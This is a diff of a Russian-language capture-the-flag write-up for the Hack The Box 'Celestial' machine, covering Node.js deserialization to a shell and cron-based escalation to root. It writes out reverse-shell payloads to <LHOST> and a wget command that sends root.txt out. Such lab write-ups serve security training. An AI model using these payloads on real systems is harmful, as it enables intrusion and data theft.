@@ -21,7 +21,7 @@ comments: true
 
 # nmap
 Начинаем со сканирования, разведка — наше все. По традиции сначала быстрое stealth-сканирование для получения общей картины:
-```
+```text
 root@kali:~# nmap -n -vvv -sS -Pn --min-rate 5000 -oA nmap/initial 10.10.10.85
 Nmap scan report for 10.10.10.85
 Host is up, received user-set (0.066s latency).
@@ -42,7 +42,7 @@ Read data files from: /usr/bin/../share/nmap
 ```
 
 Потом собираем больше информации о приложениях на открытых портах:
-```
+```text
 root@kali:~# nmap -n -vvv -sS -sV -sC -oA nmap/version -p3000 10.10.10.85
 Nmap scan report for 10.10.10.85
 Host is up, received echo-reply ttl 63 (0.055s latency).
@@ -79,7 +79,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 [![celestial-port3000-burp-1.png]({{ "/img/htb/boxes/celestial-port3000-burp-1.png" | relative_url }})]({{ "/img/htb/boxes/celestial-port3000-burp-1.png" | relative_url }})
 
 Cookie с профилем. Это объясняет, почему в первый раз пришло сообщение об ошибке (первый запрос был без печенек). Посмотрим, что представляет из себя значение профиля:
-```
+```text
 root@kali:~# base64 -d <<< 'eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ=='
 {"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}
 ```
@@ -105,7 +105,7 @@ eyJ1c2VybmFtZSI6ICIzdjNsX2g0Y2szciIsICJjb3VudHJ5IjogIlNoYW5ncmktTGEiLCAiY2l0eSI6
 ```
 
 Поставим tcpdump слушать нужный интерфейс на ICMP-пакеты и выстрелим запросом из Burp:
-```
+```text
 root@kali:~# tcpdump -vv -i tun0 icmp
 tcpdump: listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
 07:47:06.901111 IP (tos 0x0, ttl 63, id 51198, offset 0, flags [DF], proto ICMP (1), length 84)
@@ -124,7 +124,7 @@ tcpdump: listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
 Я использовал [этот](https://github.com/hoainam1989/training-application-security/blob/master/shell/node_shell.py "training-application-security/node_shell.py at master · hoainam1989/training-application-security") скрипт для генерации reverse-shell'а. Он кодирует строку пейлоада в ASCII-коды, чтобы избежать путаниц с bad-символами (кавычки, слэши и т. д.), а при выполнении на сервере будет использована функция *String.fromCharCode*, которая выполнит обратное преобразование.
 
 Сгенерируем нагрузку:
-```
+```text
 root@kali:~# python node_shell.py -h <LHOST> -p 31337 -r -e -o
 =======> Happy hacking <======
 
@@ -142,7 +142,7 @@ root@kali:~# python node_shell.py -h <LHOST> -p 31337 -r -e -o
 
 # Внутри машины
 А тем временем:
-```
+```text
 root@kali:~# nc -nlvvp 31337
 Ncat: Version 7.70 ( https://nmap.org/ncat )
 Ncat: Listening on :::31337
@@ -180,7 +180,7 @@ Documents  examples.desktop  node_modules  Pictures    server.js  Videos
 ```
 
 Ну вот, совсем другое дело! Познакомимся с системой, куда вломились:
-```
+```text
 sun@sun:~$ whoami
 sun
 
@@ -193,13 +193,13 @@ Linux sun 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x8
 
 ## user.txt
 Заберем флаг пользователя:
-```
+```text
 sun@sun:~$ cat /home/sun/Documents/user.txt
 9a093cd2????????????????????????
 ```
 
 И обдумаем PrivEsc-план. Для начала посмотрим, что в домашнем каталоге:
-```
+```text
 sun@sun:~$ ls -la
 total 152
 drwxr-xr-x 21 sun  sun  4096 Aug 24 19:20 .
@@ -241,25 +241,25 @@ drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Videos
 ```
 
 В истории пусто:
-```
+```text
 sun@sun:~$ cat .bash_history
 
 ```
 
 Сразу в глаза бросается файл `output.txt` неизвестной природы. Владелец — root, читать могут все. Почитаем, раз разрешают:
-```
+```text
 sun@sun:~$ cat output.txt
 Script is running...
 ```
 
 Хмм, говорят, скрипт где-то бегает. Немного поискав, находим такой файл:
-```
+```text
 sun@sun:~$ ls -la Documents | grep script.py
 -rwxrwxrwx  1 sun  sun    29 Sep 21  2017 script.py
 ```
 
 Который изменять может кто угодно, а внутри:
-```
+```text
 sun@sun:~$ cat Documents/script.py
 print "Script is running..."
 ```
@@ -284,12 +284,12 @@ Aug 24 19:40:01 sun CRON[4629]: (root) CMD (python /home/sun/Documents/script.py
 
 ## PrivEsc: sun → root. Способ 1
 Для начала предлагаю получить полноценный root-шелл, чтобы честно сказать, что мы полностью захватили машину. Для этого, не мудрствуя лукаво, перезапишем `script.py` стандартным для Пайтона reverse-shell'ом:
-```
+```text
 sun@sun:~$ echo 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/bash");s.close()' > Documents/script.py
 ```
 
 И ждем коннекта на listener'е:
-```
+```text
 root@kali:~# nc -nlvvp 4444
 Ncat: Version 7.70 ( https://nmap.org/ncat )
 Ncat: Listening on :::4444
@@ -306,7 +306,7 @@ uid=0(root) gid=0(root) groups=0(root)
 
 ### root.txt
 После этого можно забирать флаг:
-```
+```text
 root@sun:~# cat /root/root.txt
 ba1d0019????????????????????????
 ```
@@ -350,13 +350,13 @@ Serving HTTP on 0.0.0.0 port 8888 ...
 ```
 
 После чего с машины-жертвы сделаем попытку скачать несуществующий файл, имеющий название, совпадающее с содержимым флага root'а:
-```
+```text
 sun@sun:~$ echo 'import os;os.system("wget http://<LHOST>:8888/$(cat /root/root.txt)");print "f4ckU!"' > Documents/script.py
 ```
 
 ### root.txt
 Ждем ⩽ 5 минут, и, о чудо:
-```
+```text
 Serving HTTP on 0.0.0.0 port 8888 ...
 10.10.10.85 - - [24/Aug/2018 22:25:02] code 404, message File not found
 10.10.10.85 - - [24/Aug/2018 22:25:02] "GET /ba1d0019???????????????????????? HTTP/1.1" 404 -
@@ -407,7 +407,7 @@ app.listen(3000);
 
 ## cron
 Будучи root'ом, изучим задание cron'а:
-```
+```text
 root@sun:~# crontab -l | grep -vF '#'
 */5 * * * * python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py
 ```
